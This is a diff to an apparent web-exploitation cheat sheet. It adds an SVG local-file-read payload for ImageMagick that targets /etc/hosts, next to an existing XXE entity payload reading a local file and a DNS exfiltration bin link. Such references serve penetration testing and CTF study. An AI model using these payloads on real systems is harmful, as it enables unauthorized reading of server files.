@@ -91,6 +91,15 @@ Injection:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///tmp/test.html"> %xxe;]>
 ```  
 http://dnsbin.zhack.ca/  
+### LFI
+SVG LFI (ImageMagick):  
+https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/  
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="1200px" height="1200px">
+  <image width="1200" height="1200" href="text:/etc/hosts" />
+</svg>
+```
 ### ESI 
 *Edge Side Include Injection*    
 WAF'alike bypass:
